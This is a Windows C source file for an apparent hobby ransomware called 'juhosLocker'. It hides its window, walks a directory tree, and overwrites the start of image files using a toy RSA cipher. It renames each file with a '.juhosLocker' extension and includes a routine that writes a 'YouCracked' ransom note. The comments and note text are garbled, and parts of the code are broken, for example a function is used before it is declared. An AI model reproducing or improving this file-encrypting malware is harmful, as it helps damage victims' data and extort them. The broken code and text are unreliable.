#pragma warning ( disable : 4996 )
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <Windows.h>
#include <time.h> 
#include<sys/types.h>
#include<math.h>

#define p_deci 3
#define q_deci 7

int N;
int P;
int e;
int d;
int cnt[1024];

struct _finddata_t fd;
void encrypt(char* filefullname);
void decrypt(char* filefullname);
int isFileOrDir();
void findfile(char* file_path);
void name_change(char* name);
int Get_P(int p, int q);
int Get_N(int p, int q);
int Get_e(int P);
int Get_d(int e, int P);
int GCD(int u, int v);
void Create_file(char* file_path);

int main()
{
	
	HWND hWnd = GetForegroundWindow();		//��׶��� ����
	ShowWindow(hWnd, SW_HIDE);
	N = Get_N(p_deci,q_deci);					//����Ű
	P = Get_P(p_deci,q_deci);
	e = Get_e(P);								//����Ű
	d = Get_d(e, P);							//����Ű
	char file_path[_MAX_PATH] = "C:\\opencv";    //C:\ ��� Ž��
	char file_path2[_MAX_PATH];
	strcpy(file_path2, file_path);
	//Create_file(file_path);						//�ؽ�Ʈ ���� ����
	findfile(file_path2);						//���� �˻� �� ��ȣȭ
	return 0;
}
int isFileOrDir()
{
	if (fd.attrib & _A_SUBDIR)
		return 0; // ���丮�� 0 ��ȯ
	else
		return 1; // �׹��� ���� "�����ϴ� ����"�̱⿡ 1 ��ȯ
}

void findfile(char* file_path)
{
	intptr_t handle;
	int check = 0;
	char file_path2[_MAX_PATH];

	strcat(file_path, "\\");
	strcpy(file_path2, file_path);
	strcat(file_path, "*");

	if ((handle = _findfirst(file_path, &fd)) == -1)
	{
		printf("No such file or directory\n");
		return;
	}

	while (_findnext(handle, &fd) == 0)
	{
		char file_pt[_MAX_PATH];
		strcpy(file_pt, file_path2);
		strcat(file_pt, fd.name);

		check = isFileOrDir();    //�������� ���丮 ���� �ĺ�

		if (check == 0 && fd.name[0] != '.')
		{
			findfile(file_pt);    //���� ���丮 �˻� ����Լ�
		}
		else if (check == 1 && fd.size != 0 && fd.name[0] != '.')
		{
			if ((strstr(file_pt, ".png") != NULL) || (strstr(file_pt, ".jpeg") != NULL) ||		//���� �����Ͻ� encrypt�Լ� ����
				(strstr(file_pt, ".gif") != NULL) || (strstr(file_pt, ".bmp") != NULL) || (strstr(file_pt,".jpg") != NULL)){
				
				encrypt(file_pt);			//��ȣȭ �Լ� ����
				decrypt(file_pt);
				name_change(file_pt);		//���� �̸� ���� �Լ� ����
			}
		}
	}
	_findclose(handle);
}
void encrypt(char* filefullname) {
	unsigned char data[1024];
	unsigned int read_size;
	unsigned int i;
	long frpos, fwpos;
	FILE *fp;									//���� ����ü ����
	fp = fopen(filefullname, "r+b");			//���� ����
	if (fp == NULL)								//������ ���ȴ��� Ȯ��
	{
		if (strstr(filefullname,".") == 0)
			findfile(filefullname);
		return;
	}
	fwpos = ftell(fp);				//������ �аų� ���鼭 �̵��ϴ� ���� ��ġ�� ��ġ�� ��ȯ
	read_size = fread(data, 1, 1024, fp);		//������ ���� ������
	for (i = 0; i < read_size; i++) {			//���� ������ RSA ��ȣȭ
		int M = data[i];
		unsigned int m;
		m = Get_m(M, N,i);
		m = pow(m, e);
		data[i] = m % N;						//c = (m^e)%N
	}
	frpos = ftell(fp);
	fseek(fp, fwpos, SEEK_SET);						//ó�� ��ġ�� �̵�
	fwrite(data, sizeof(char), read_size, fp);		//ó������ 1024byte ���� ��ȣȭ ������ �����
	fclose(fp);										//����� ���� ����
}
void decrypt(char* filefullname) {
	unsigned char data[1024];
	unsigned char name[4] = { 0x4A,0x55,0x48,0x4F };
	unsigned int read_size;
	unsigned int i;
	int type = 0;
	long frpos, fwpos;
	FILE *fp;									//���� ����ü ����
	fp = fopen(filefullname, "r+b");			//���� ����
	if (fp == NULL)								//������ ���ȴ��� Ȯ��
	{
		if (strstr(filefullname, ".") == 0)
			findfile(filefullname);
		return;
	}
	fwpos = ftell(fp);				//������ �аų� ���鼭 �̵��ϴ� ���� ��ġ�� ��ġ�� ��ȯ
									//sig_size = fread(signature, 1, 16, fp);
	read_size = fread(data, 1, 1024, fp);		//������ ���� ������
	for (i = 0; i < read_size; i++) {			//���� ������ ��ȣȭ
		unsigned int c = data[i];
		int m;
		c = pow(c, d);
		m = c % N;
		m += (cnt[i] * N);
		data[i] = m;						//m = (c^d)%N;
	}
	frpos = ftell(fp);
	fseek(fp, fwpos, SEEK_SET);						//ó�� ��ġ�� �̵�
	fwrite(data, sizeof(char), read_size, fp);		//ó������ 1024byte ���� ��ȣȭ ������ �����
	fclose(fp);										//����� ���� ����
}
void name_change(char* name) {
	char new_name[1024];				//�̸��� ���� ����
	int type = 0;
	sprintf_s(new_name, sizeof(new_name), "%s.juhosLocker", name);		//������ �̸� ����
	type = rename(name, new_name);				//�̸� ���� rename(oldname,newname)
}
void Create_file(char* file_path) {
	FILE *fp;
	strcat(file_path, "\\");
	strcat(file_path, "YouCracked!!!!!!!!!!!!!!!!!!!!!!!!!!!.txt");
	fp = fopen(file_path, "w+t");
	if (fp == NULL) {
		Create_file(file_path);
		return;
	}
	fprintf(fp, "����� ��ǻ�ʹ� ���� ��ŷ�Ǿ����ϴ�. ��ȣȭ�� ���ϵ��� Ǯ�� ������ ������ ���� �����ʽÿ�. �˰ڽ��ϱ�?");
	fclose(fp);
}
int Get_N(int p, int q) {			//����Ű ���ϴ� �Լ�
	return p * q;
}
int Get_P(int p, int q) {
	return ((p - 1)*(q - 1));
}
int Get_d(int e, int P) {				//����Ű ���ϴ� �Լ�
	int i = 1;
	while (1) {
		if (((i*e) % P) == 1) {
			return i;
		}
		else {
			i++;
		}
	}
}
int Get_e(int P) {
	for (int i = 2; i < P; i++) {			//�ִ� ������� 1�� e�� ã�� �Լ�
		int num = GCD(i, P);
		if (num == 1) {
			return i;
		}
	}
}
int GCD(int a, int b) {		//��Ŭ���� �˰����� �̿��� �ִ����� ã��
	if (b == 0) {
		return a;
	}
	else {
		return GCD(b, a%b);
	}
}
int Get_m(int M, int N,int i)			//����Ű ���ϴ� �Լ�
{
	int count = 0;
	while (M >= N)
	{
		M -= N;
		count++;
	}
	cnt[i] = count;						//M->m ��� ����
	return M;
}

/*
while (!feof(fp))			//���� �� ���� Ȯ��
{
fwpos = ftell(fp);		//������ �аų� ���鼭 �̵��ϴ� ���� ��ġ�� ��ġ�� ��ȯ
read_size = fread(data, 1, 1024, fp);
if (read_size == 0)break;
for (i = 0; i < read_size; i++) {
data[i] ^= the_key[i % 10];
}
frpos = ftell(fp);
fseek(fp, fwpos, SEEK_SET);
fwrite(data, 1, read_size, fp);
fseek(fp, frpos, SEEK_SET);
}
*/